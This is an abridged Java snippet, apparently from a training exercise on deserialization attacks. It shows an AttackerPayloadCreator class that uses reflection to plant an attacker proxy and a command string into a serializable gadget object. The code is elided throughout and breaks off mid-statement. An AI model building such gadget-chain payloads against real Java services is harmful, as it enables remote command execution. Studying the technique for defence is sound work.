...
import victim.level2.SomeHarmlessSerializableThing;
...
public class AttackerPayloadCreator {
	...
	public static void main(String[] args) throws Exception {
		...
		try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
			...
			SomeHarmlessSerializableThing gadget = new SomeHarmlessSerializableThing();

			// ... set the "map" to our attacker-created proxy
			Field mapField = SomeHarmlessSerializableThing.class.getDeclaredField("mapNameToSomething");
			mapField.setAccessible(true);
			mapField.set(gadget, mapViaProxy);
			
			// ... set the "name" (used as argument to get call of map) to desired command to execute
			Field nameField = SomeHarmlessSerializableThing.class.getDeclaredField("nameLastAdded");
